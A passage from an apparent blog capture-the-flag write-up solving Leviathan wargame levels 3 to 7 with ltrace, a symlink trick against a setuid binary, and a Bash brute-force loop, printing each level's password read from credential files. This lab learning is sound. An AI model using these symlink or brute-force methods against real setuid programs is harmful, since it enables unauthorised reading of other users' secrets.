</span><span class='line'>strcmp("huh\n", "snlprintf\n")                                                              = -1
</span><span class='line'>puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
</span><span class='line'>)                                                                  = 19
</span><span class='line'>+++ exited (status 0) +++</span></code></pre></td></tr></table></div></figure>


<p>The first <em>strcmp</em> doesn&rsquo;t seem to be used for anything, but the second one is interesting. It compares the given input with..snlprintf?! There is no such function in the C library, so I assumed it&rsquo;s just a string..and:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan3@melinda:~$ ./level3 
</span><span class='line'>Enter the password&gt; snlprintf
</span><span class='line'>[You've got shell]!
</span><span class='line'>$ whoami
</span><span class='line'>leviathan4
</span><span class='line'>$ cat /etc/leviathan_pass/leviathan4
</span><span class='line'>vuH0coox6m</span></code></pre></td></tr></table></div></figure>


<p>Awesome! On to the next level!</p>

<h3>Level 4 &ndash;> Level 5</h3>

<p>There is a hidden directory in the home folder:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan4@melinda:~$ ls -la
</span><span class='line'>total 24
</span><span class='line'>drwxr-xr-x   3 root root       4096 Nov 14  2014 .
</span><span class='line'>drwxr-xr-x 167 root root       4096 Jul  9 16:27 ..
</span><span class='line'>-rw-r--r--   1 root root        220 Apr  9  2014 .bash_logout
</span><span class='line'>-rw-r--r--   1 root root       3637 Apr  9  2014 .bashrc
</span><span class='line'>-rw-r--r--   1 root root        675 Apr  9  2014 .profile
</span><span class='line'>dr-xr-x---   2 root leviathan4 4096 Nov 14  2014 .trash</span></code></pre></td></tr></table></div></figure>


<p>Inside there&rsquo;s a program that gives some binary output when run:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan4@melinda:~/.trash$ ./bin 
</span><span class='line'>01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010 </span></code></pre></td></tr></table></div></figure>


<p>Convert it to Ascii for the password: <code>Tith4cokei</code></p>

<h3>Level 5 &ndash;> Level 6</h3>

<p>Another binary! If you run it, it says it can&rsquo;t find a file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan5@melinda:~$ ./leviathan5 
</span><span class='line'>Cannot find /tmp/file.log</span></code></pre></td></tr></table></div></figure>


<p>This is a setuid binary, so maybe we can trick it into reading the password file for the leviathan5 user. I made a symlink to the password file with the name of the missing file, and the binary followed it right to the password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
</span><span class='line'>leviathan5@melinda:~$ ./leviathan5 
</span><span class='line'>UgaoFee4li</span></code></pre></td></tr></table></div></figure>


<h3>Level 6 &ndash;> Level 7</h3>

<p>And yet another binary! This one asks for a 4-digit code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan6@melinda:~$ ./leviathan6 
</span><span class='line'>usage: ./leviathan6 &lt;4 digit code&gt;</span></code></pre></td></tr></table></div></figure>


<p>Lookint at the strings, it seems this program will give us a shell if we can find the right code. I was going to use Python again but I found a quick and easy way to bruteforce the code with a very small Bash script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
</span><span class='line'>
</span><span class='line'><span class="k">for </span>i in <span class="o">{</span>0000..9999<span class="o">}</span>
</span><span class='line'><span class="k">do</span>
</span><span class='line'><span class="nb">echo</span> <span class="s1">&#39;Trying&#39;</span> <span class="nv">$i</span>
</span><span class='line'>~/leviathan6 <span class="nv">$i</span>
</span><span class='line'><span class="k">done</span>
</span></code></pre></td></tr></table></div></figure>


<p>This script iterates over the range of possible codes and tries each of them as input for the leviathan6 binary:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'>Trying 7122
</span><span class='line'>Wrong
</span><span class='line'>Trying 7123
</span><span class='line'>$ whoami
</span><span class='line'>leviathan7
</span><span class='line'>$ cat /etc/leviathan_pass/leviathan7
</span><span class='line'>ahy7MaeBo9</span></code></pre></td></tr></table></div></figure>


<h3>Level 7 &ndash;> Level 8</h3>

<p>This is the final level, as you can see from the congratulatory note:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>leviathan7@melinda:~$ ls
</span><span class='line'>CONGRATULATIONS
</span><span class='line'>leviathan7@melinda:~$ cat CONGRATULATIONS 
</span><span class='line'>Well Done, you seem to have used a *nix system before, now try something more serious.
</span><span class='line'>(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)</span></code></pre></td></tr></table></div></figure>


<p>Better skip over that last line&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ________________________________________
</span><span class='line'>/ Tomorrow will be cancelled due to lack \
</span><span class='line'>\ of interest.                           /
</span><span class='line'> ----------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
</feed>
